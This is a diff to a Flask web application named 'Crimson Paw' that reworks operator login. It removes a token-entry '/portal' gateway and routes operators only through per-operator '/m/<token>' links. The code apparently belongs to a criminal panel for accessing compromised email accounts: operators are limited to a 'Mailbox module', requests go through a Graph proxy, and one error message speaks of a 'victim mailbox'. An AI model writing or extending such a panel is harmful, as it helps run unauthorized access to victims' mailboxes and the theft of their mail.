@@ -4017,7 +4017,7 @@ HTML_TEMPLATE = r'''
                 console.warn('Logout API error:', err);
             }
             if (isOperator) {
-                window.location.href = opToken ? ('/m/' + encodeURIComponent(opToken)) : '/portal';
+                window.location.href = opToken ? ('/m/' + encodeURIComponent(opToken)) : '/';
             } else {
                 window.location.href = '/login';
             }
@@ -13058,25 +13058,16 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
             <img src="/static/img/crimson_paw_logo.png" alt="Crimson Paw" class="brand-logo">
             <div class="brand-title">CRIMSON PAW</div>
             <div class="brand-subtitle">Operator Access Gateway</div>
-            <div class="portal-badge">PORTAL: {% if token %}/m/{{ token }}{% else %}OPERATOR ACCESS GATEWAY{% endif %}</div>
+            <div class="portal-badge">PORTAL: /m/{{ token }}</div>
         </div>
 
         <div id="op-alert" class="alert-box"></div>
 
         <!-- Step 1: Access Key Entry -->
         <form id="step-key" onsubmit="submitAccessKey(event)">
-            {% if not token %}
-            <div class="form-group">
-                <label class="form-label" for="op-portal-token">Portal Token / Identifier</label>
-                <input type="text" id="op-portal-token" class="form-input" placeholder="e.g. a1b2c3d4e5f6" autocomplete="off" required>
-                <div style="font-size:0.72rem; color:#705f63; margin-top:4px;">
-                    Enter your designated operator portal access token.
-                </div>
-            </div>
-            {% endif %}
             <div class="form-group">
                 <label class="form-label" for="op-key">Operator Access Key</label>
-                <input type="password" id="op-key" class="form-input" placeholder="••••••••••••" autocomplete="current-password" required {% if token %}autofocus{% endif %}>
+                <input type="password" id="op-key" class="form-input" placeholder="••••••••••••" autocomplete="current-password" required autofocus>
                 <div style="font-size:0.72rem; color:#705f63; margin-top:4px;">
                     Enter the access key generated for this operator account (e.g. CP-XXXX-XXXX).
                 </div>
@@ -13132,7 +13123,7 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
     </div>
 
     <script>
-        let portalToken = "{{ token if token else '' }}";
+        const portalToken = "{{ token }}";
         let opExpiryTimer = null;
         let opRemainingSec = 300;
 
@@ -13207,26 +13198,12 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
             document.getElementById('step-setup-2fa').style.display = 'none';
             document.getElementById('step-verify-2fa').style.display = 'none';
             document.getElementById('op-alert').style.display = 'none';
-            const tokInput = document.getElementById('op-portal-token');
-            if (tokInput) tokInput.focus();
-            else document.getElementById('op-key').focus();
+            document.getElementById('op-key').focus();
         }
 
         async function submitAccessKey(e) {
             e.preventDefault();
             const btn = document.getElementById('btn-key');
-            let curToken = portalToken;
-            if (!curToken) {
-                const tokInput = document.getElementById('op-portal-token');
-                if (tokInput) {
-                    curToken = tokInput.value.trim().replace(/^.*\/m\//, '').replace(/\?.*$/, '');
-                }
-            }
-            if (!curToken) {
-                showAlert('Please enter your Portal Token / Identifier.');
-                return;
-            }
-            portalToken = curToken;
             const key = document.getElementById('op-key').value.trim();
             btn.disabled = true;
             btn.innerText = 'Verifying Hardware & Key...';
@@ -13407,7 +13384,7 @@ def require_admin_login():
         return None
     session.permanent = True
     # 2. Allow public home landing page, login, logout, preview showcase, and operator portal
-    if (request.path in ('/', '/landing', '/login', '/logout', '/preview', '/portal', '/operator', '/api/auth/login', '/api/auth/logout', '/api/auth/verify-2fa', '/api/auth/resend-2fa', '/api/auth/test-otp') 
+    if (request.path in ('/', '/landing', '/login', '/logout', '/preview', '/api/auth/login', '/api/auth/logout', '/api/auth/verify-2fa', '/api/auth/resend-2fa', '/api/auth/test-otp') 
         or request.path.startswith('/m/') 
         or request.path.startswith('/api/m/')
         or request.path == '/api/admin/client-lock'
@@ -13471,7 +13448,7 @@ def require_admin_login():
                 return jsonify({'error': 'Unauthorized: Operator account is disabled or missing.'}), 401
             if op_tok:
                 return redirect(f'/m/{op_tok}')
-            return redirect('/portal')
+            return redirect('/')
 
         # ── ANTI-ACCOUNT SHARING: ZERO-CONCURRENCY SESSION NONCE VALIDATION ──
         sess_nonce = session.get('session_nonce')
@@ -13508,7 +13485,7 @@ def require_admin_login():
         if not is_allowed:
             if request.path.startswith('/api/'):
                 return jsonify({'error': 'Forbidden: Operator accounts can only access the Mailbox module.'}), 403
-            portal_url = f"/m/{session.get('operator_token')}" if session.get('operator_token') else "/portal"
+            portal_url = f"/m/{session.get('operator_token')}" if session.get('operator_token') else "/"
             return redirect(portal_url)
 
         # For /api/graph_proxy/* enforce that requested user_code is assigned to this operator
@@ -13518,22 +13495,6 @@ def require_admin_login():
                 return jsonify({'error': {'message': 'Forbidden: You do not have permission to access this victim mailbox.'}}), 403
 
     return None
-
-@app.route('/portal')
-@app.route('/operator')
-def operator_portal_gateway():
-    # If active authenticated operator session exists, take them directly into their portal
-    if session.get('authenticated') and session.get('role') == 'operator' and session.get('operator_token'):
-        return redirect(f"/m/{session.get('operator_token')}")
-
-    # Check for token in query param, session, or remembered cookie
-    tok = request.args.get('token') or session.get('operator_token') or request.cookies.get('last_operator_token')
-    if tok:
-        op = db.get_operator_by_token(tok)
-        if op:
-            return redirect(f"/m/{tok}")
-
-    return render_template_string(CRIMSON_PAW_OPERATOR_PORTAL_HTML, token='', op=None)
 
 @app.route('/m/<token>')
 def operator_codified_portal(token):
@@ -13805,7 +13766,7 @@ def login_route():
         if session.get('role') == 'operator':
             if session.get('operator_token'):
                 return redirect(f"/m/{session.get('operator_token')}")
-            return redirect('/portal')
+            return redirect('/')
         return redirect('/dashboard')
     return render_template_string(CRIMSON_PAW_LOGIN_HTML)
 
@@ -13835,7 +13796,7 @@ def logout_route():
     session.clear()
 
     if is_operator or request.args.get('token'):
-        return redirect(f"/m/{op_token}" if op_token else "/portal")
+        return redirect(f"/m/{op_token}" if op_token else "/")
     return redirect('/login')
 
 # ── Brute Force Lockout & Telegram 2FA State ───────────────────────
@@ -14137,7 +14098,7 @@ def api_auth_logout():
     if not op_token and request.cookies.get('last_operator_token'):
         op_token = request.cookies.get('last_operator_token')
     session.clear()
-    redirect_url = f'/m/{op_token}' if (is_operator and op_token) else ('/portal' if is_operator else '/login')
+    redirect_url = f'/m/{op_token}' if (is_operator and op_token) else ('/' if is_operator else '/login')
     return jsonify({'success': True, 'redirect': redirect_url})
 
 @app.route('/api/auth/me', methods=['GET'])
